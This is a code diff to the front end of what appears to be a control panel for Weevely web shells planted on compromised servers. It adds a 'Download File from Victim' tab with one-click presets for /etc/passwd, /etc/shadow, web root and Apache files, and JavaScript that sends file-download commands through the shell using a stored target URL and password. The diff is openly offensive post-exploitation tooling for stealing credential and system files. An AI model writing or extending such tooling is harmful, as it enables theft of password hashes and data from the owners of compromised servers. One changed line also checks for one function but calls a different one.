@@ -153,6 +153,11 @@
               <i class="fas fa-archive"></i> Archive
             </button>
           </li>
+          <li class="nav-item" role="presentation">
+            <button class="nav-link" id="file-ops-download-tab" data-bs-toggle="tab" data-bs-target="#file-ops-download-pane" type="button" role="tab">
+              <i class="fas fa-download"></i> Download
+            </button>
+          </li>
         </ul>
 
         <div class="tab-content mt-3" id="fileOpsTabContent">
@@ -221,6 +226,44 @@
               </button>
               <button class="btn btn-info" onclick="executeFileZip()">
                 <i class="fas fa-file-archive"></i> ZIP
+              </button>
+            </div>
+          </div>
+
+          <!-- Download Tab -->
+          <div class="tab-pane fade" id="file-ops-download-pane" role="tabpanel">
+            <h5><i class="fas fa-download"></i> Download File from Victim</h5>
+            <div class="form-group mb-3">
+              <label class="form-label">Remote File Path on Victim <span class="text-danger">*</span></label>
+              <input type="text" id="file_ops_download_path" class="form-control" placeholder="/etc/passwd" required>
+              <small class="form-text text-muted">Nhập đường dẫn file trên máy victim cần download</small>
+            </div>
+            <div class="form-group mb-3">
+              <label class="form-label">Vector (optional)</label>
+              <select id="file_ops_download_vector" class="form-control">
+                <option value="">Auto</option>
+                <option value="file_get_contents">file_get_contents</option>
+                <option value="fread">fread</option>
+                <option value="readfile">readfile</option>
+                <option value="curl">curl</option>
+              </select>
+            </div>
+            <div class="form-group mb-3">
+              <div class="d-flex gap-2 flex-wrap">
+                <button class="btn btn-sm btn-outline-secondary" onclick="setFileOpsDownloadPath('/etc/passwd')">passwd</button>
+                <button class="btn btn-sm btn-outline-secondary" onclick="setFileOpsDownloadPath('/etc/shadow')">shadow</button>
+                <button class="btn btn-sm btn-outline-secondary" onclick="setFileOpsDownloadPath('/var/www/html/index.php')">index.php</button>
+                <button class="btn btn-sm btn-outline-secondary" onclick="setFileOpsDownloadPath('/var/log/apache2/access.log')">access.log</button>
+                <button class="btn btn-sm btn-outline-secondary" onclick="setFileOpsDownloadPath('/etc/apache2/apache2.conf')">apache2.conf</button>
+              </div>
+            </div>
+            <div class="alert alert-info">
+              <i class="fas fa-info-circle"></i>
+              File sẽ được tải về server vào thư mục dataserver/download và hiển thị trong danh sách Downloaded Files.
+            </div>
+            <div class="d-flex gap-2">
+              <button class="btn btn-primary" onclick="executeFileOpsDownload()">
+                <i class="fas fa-download"></i> Download File
               </button>
             </div>
           </div>
@@ -498,6 +541,144 @@
 
 <!-- Modal Functions Script -->
 <script>
+// Test function
+function testFileOperationsModal() {
+    console.log('=== TEST Button Clicked ===');
+    showFileOperationsModal();
+}
+
+// Helper function to show Weevely connection instructions
+function showWeevelyConnectionInstructions() {
+    const instructions = `
+To use File Operations, you need an active Weevely connection:
+
+1. Click "QUICK SETUP" button (green button)
+2. Or go to the Weevely Terminal section
+3. Enter your Weevely URL (e.g., http://target.com/shell.php)
+4. Enter your Weevely password
+5. Click "Test Connection" to verify
+6. Once connected, return to File Operations
+
+Current status: No active Weevely connection found.
+    `;
+    
+    alert(instructions);
+    
+    // Try to scroll to weevely terminal
+    const weevelyTerminal = document.getElementById('weevely-terminal-container');
+    if (weevelyTerminal) {
+        weevelyTerminal.scrollIntoView({ behavior: 'smooth' });
+    }
+}
+
+// Quick Weevely Setup function
+function showQuickWeevelySetup() {
+    const url = prompt('Enter Weevely URL (e.g., http://target.com/shell.php):');
+    if (!url) return;
+    
+    const password = prompt('Enter Weevely password:');
+    if (!password) return;
+    
+    // Set the connection
+    window.currentWeevelyConnection = {
+        url: url.trim(),
+        password: password.trim(),
+        timeout: 60
+    };
+    
+    console.log('✅ Quick setup completed:', {
+        url: url.trim(),
+        password: '***'
+    });
+    
+    // Try to fill form inputs if they exist
+    const urlInput = document.querySelector('input[name="url"], input[id*="url"], input[placeholder*="URL"]');
+    const passwordInput = document.querySelector('input[name="password"], input[id*="password"], input[type="password"]');
+    
+    if (urlInput) urlInput.value = url.trim();
+    if (passwordInput) passwordInput.value = password.trim();
+    
+    alert('✅ Weevely connection setup completed!\n\nURL: ' + url + '\nPassword: ***\n\nYou can now use File Operations.');
+}
+
+// Auto-initialize weevely connection from URL params or existing data
+function initializeWeevelyConnection() {
+    console.log('=== Initializing Weevely Connection ===');
+    
+    // Try to get from URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const weevelyUrl = document.getElementById('weevely_url').value;
+    const weevelyPassword = document.getElementById('weevely_password').value;
+    
+    // Try to get from form inputs (if pre-filled)
+    const urlInput = document.querySelector('input[name="url"], input[id*="url"], input[placeholder*="URL"]');
+    const passwordInput = document.querySelector('input[name="password"], input[id*="password"], input[type="password"]');
+    
+    let finalUrl = weevelyUrl || (urlInput ? urlInput.value : null);
+    let finalPassword = weevelyPassword || (passwordInput ? passwordInput.value : null);
+    
+    console.log('URL from params:', weevelyUrl);
+    console.log('Password from params:', weevelyPassword ? '***' : null);
+    console.log('URL from input:', urlInput ? urlInput.value : null);
+    console.log('Password from input:', passwordInput ? '***' : null);
+    
+    // Try to get from page data attributes or window object
+    if (!finalUrl || !finalPassword) {
+        // Check if there's weevely data in window
+        if (window.weevelyData) {
+            finalUrl = finalUrl || window.weevelyData.url;
+            finalPassword = finalPassword || window.weevelyData.password;
+            console.log('Found weevely data in window:', window.weevelyData);
+        }
+        
+        // Check for data attributes on body
+        const body = document.body;
+        finalUrl = finalUrl || body.getAttribute('data-weevely-url');
+        finalPassword = finalPassword || body.getAttribute('data-weevely-password');
+    }
+    
+    // If we have both URL and password, initialize connection
+    if (finalUrl && finalPassword) {
+        window.currentWeevelyConnection = {
+            url: finalUrl,
+            password: finalPassword,
+            timeout: 60
+        };
+        
+        console.log('✅ Auto-initialized Weevely connection:', {
+            url: finalUrl,
+            password: '***',
+            source: 'auto-detected'
+        });
+        
+        // Fill in form fields if they exist and are empty
+        if (urlInput && !urlInput.value) {
+            urlInput.value = finalUrl;
+        }
+        if (passwordInput && !passwordInput.value) {
+            passwordInput.value = finalPassword;
+        }
+        
+        return true;
+    } else {
+        console.log('❌ Could not auto-initialize connection. Missing URL or password.');
+        console.log('Available URL:', finalUrl);
+        console.log('Available Password:', finalPassword ? '***' : null);
+        return false;
+    }
+}
+
+// Test when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('=== DOM Content Loaded ===');
+    console.log('Bootstrap available:', typeof bootstrap !== 'undefined');
+    console.log('fileOperationsModal element:', document.getElementById('fileOperationsModal'));
+    
+    // Try to auto-initialize connection
+    setTimeout(() => {
+        initializeWeevelyConnection();
+    }, 1000);
+});
 // File Search Modal Functions
 function showFileSearchModal() {
     const modal = new bootstrap.Modal(document.getElementById('fileSearchModal'));
@@ -532,9 +713,25 @@ function setFilePath(path) {
     document.getElementById('modal_file_path').value = path;
 }
 
+function setFileOpsDownloadPath(path) {
+    console.log('setFileOpsDownloadPath called with:', path);
+    const element = document.getElementById('file_ops_download_path');
+    console.log('file_ops_download_path element:', element);
+    if (element) {
+        element.value = path;
+    } else {
+        alert('Element file_ops_download_path not found!');
+    }
+}
+
+// Legacy function for compatibility
+function setDownloadPath(path) {
+    setFileOpsDownloadPath(path);
+}
+
 function executeFileRead() {
     const filepath = document.getElementById('modal_file_path').value;
-    const vector = document.getElementById('modal_read_vector').value || 'file_get_contents';
+    const vector = document.getElementById('modal_read_vector').value || 'base64';
     
     if (!filepath) {
         alert('Please enter a file path');
@@ -551,13 +748,54 @@ function executeFileRead() {
 
 // File Operations Modal Functions
 function showFileOperationsModal() {
-    const modal = new bootstrap.Modal(document.getElementById('fileOperationsModal'));
-    modal.show();
+    console.log('=== showFileOperationsModal called ===');
+    
+    // Check if Bootstrap is loaded
+    if (typeof bootstrap === 'undefined') {
+        alert('ERROR: Bootstrap is not loaded!');
+        return;
+    }
+    
+    const modalElement = document.getElementById('fileOperationsModal');
+    console.log('fileOperationsModal element:', modalElement);
+    
+    if (!modalElement) {
+        alert('ERROR: fileOperationsModal not found! weevely-modals.html may not be included.');
+        return;
+    }
+    
+    // Check if modal is already visible
+    if (modalElement.classList.contains('show')) {
+        console.log('Modal already visible, closing first...');
+        const existingModal = bootstrap.Modal.getInstance(modalElement);
+        if (existingModal) {
+            existingModal.hide();
+        }
+        setTimeout(() => showFileOperationsModal(), 300);
+        return;
+    }
+    
+    try {
+        const modal = new bootstrap.Modal(modalElement);
+        modal.show();
+        console.log('Modal shown successfully');
+        
+        // Debug download tab after modal is shown
+        setTimeout(() => {
+            debugDownloadTab();
+        }, 500);
+    } catch (error) {
+        console.error('Error showing modal:', error);
+        alert('Error showing modal: ' + error.message);
+    }
 }
 
 function executeFileCopy() {
+    console.log('=== executeFileCopy called ===');
     const source = document.getElementById('source_path').value;
     const dest = document.getElementById('dest_path').value;
+    
+    console.log('Source:', source, 'Dest:', dest);
     
     if (!source || !dest) {
         alert('Please enter both source and destination paths');
@@ -638,6 +876,92 @@ function executeFileZip() {
     }
     
     executeWeevelyModule(`:file_zip ${archive} ${files}`);
+}
+
+async function executeFileOpsDownload() {
+    console.log('=== executeFileOpsDownload called ===');
+    
+    // Use same connection logic as executeWeevelyModule
+    let weevelyConn = window.currentWeevelyConnection || 
+                     (typeof currentWeevelyConnection !== 'undefined' ? currentWeevelyConnection : null);
+    
+    // If not found, try to get from active weevely connections
+    if (!weevelyConn) {
+        const urlInput = document.querySelector('input[name="url"]');
+        const passwordInput = document.querySelector('input[name="password"]');
+        if (urlInput && passwordInput && urlInput.value && passwordInput.value) {
+            weevelyConn = {
+                url: urlInput.value,
+                password: passwordInput.value
+            };
+            console.log('Found connection from form inputs for download:', weevelyConn);
+        }
+    }
+    
+    console.log('Available weevely connection for download:', weevelyConn);
+    
+    if (!weevelyConn || !weevelyConn.url) {
+        alert('Weevely connection is not initialized. Please connect to a Weevely session first.');
+        return;
+    }
+    
+    const remote = (document.getElementById('file_ops_download_path')?.value || '').trim();
+    const vector = (document.getElementById('file_ops_download_vector')?.value || '').trim();
+    
+    console.log('Remote path:', remote);
+    console.log('Vector:', vector);
+    
+    if (!remote) {
+        alert('Please enter remote file path');
+        return;
+    }
+    
+    // Build module command. Local path will be adjusted on server to dataserver/download
+    const cmd = vector ? `:file_download -vector ${vector} ${remote}` : `:file_download ${remote}`;
+    console.log('Command to execute:', cmd);
+    
+    try {
+        // Display progress
+        if (typeof showLoading === 'function') showLoading('Downloading file...');
+        if (typeof appendToTerminal === 'function') appendToTerminal(`Executing ${cmd}`, 'command');
+
+        const res = await fetch('/api/weevely/execute-module', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                url: weevelyConn.url,
+                password: weevelyConn.password,
+                module_command: cmd,
+                timeout: 120
+            })
+        });
+        const json = await res.json();
+        if (json && json.success) {
+            if (typeof appendToTerminal === 'function') appendToTerminal('Download completed successfully', 'success');
+            // Refresh download list UI if available
+            if (typeof refreshDownloadFilesList === 'function') {
+                setTimeout(() => refreshDownloadFilesList(), 500);
+            }
+            alert('File downloaded to server (dataserver/download). You can save it to your machine from the Downloaded Files tab.');
+        } else {
+            const err = json && json.error ? json.error : 'Download failed';
+            if (typeof appendToTerminal === 'function') appendToTerminal(`Download failed: ${err}`, 'error');
+            alert(`Error: ${err}`);
+        }
+    } catch (e) {
+        if (typeof appendToTerminal === 'function') appendToTerminal(`Download error: ${e.message}`, 'error');
+        alert('Download error: ' + e.message);
+    } finally {
+        if (typeof hideLoading === 'function') hideLoading();
+        // Close modal
+        const modal = bootstrap.Modal.getInstance(document.getElementById('fileOperationsModal'));
+        if (modal) modal.hide();
+    }
+}
+
+// Legacy function for compatibility  
+async function executeFileDownload() {
+    return executeFileOpsDownload();
 }
 
 // Batch Commands Modal Functions
@@ -817,29 +1141,8 @@ function copyResultData(type) {
     });
 }
 
-// Add missing executeWeevelyModule function
-function executeWeevelyModule(moduleCommand, params = {}) {
-    console.log('executeWeevelyModule called with:', moduleCommand, params);
-    
-    // Check if weevely terminal is available
-    if (typeof WeevelyModuleTerminal !== 'undefined') {
-        console.log('WeevelyModuleTerminal found, executing command...');
-        WeevelyModuleTerminal.executeModule(moduleCommand, params);
-    } else {
-        console.log('WeevelyModuleTerminal not found, showing fallback...');
-        // Fallback: show in alert
-        alert(`Command: ${moduleCommand}\n\nThis command would be executed in the Weevely terminal.\nPlease ensure the terminal is loaded first.`);
-    }
-    
-    // Close the modal after execution
-    const modal = bootstrap.Modal.getInstance(document.getElementById('fileOperationsModal'));
-    if (modal) {
-        console.log('Closing fileOperationsModal...');
-        modal.hide();
-    } else {
-        console.log('fileOperationsModal not found or already closed');
-    }
-}
+// NOTE: executeWeevelyModule function is defined in weevely-module-scripts.html
+// Removed duplicate definition to avoid conflicts
 
 // SQL Console Modal Functions
 function showSqlConsoleModal() {
@@ -891,7 +1194,7 @@ function executeSqlConsole() {
     // Check if executeWeevelyModule function exists
     if (typeof executeWeevelyModule === 'function') {
         executeWeevelyModule(command);
-    } else if (typeof executeModuleWithDisplay === 'function') {
+    } else if (typeof executeModule === 'function') {
         executeModuleWithDisplay(command);
     } else {
         alert('SQL execution function not available. Please ensure the terminal is loaded and a connection is established.');
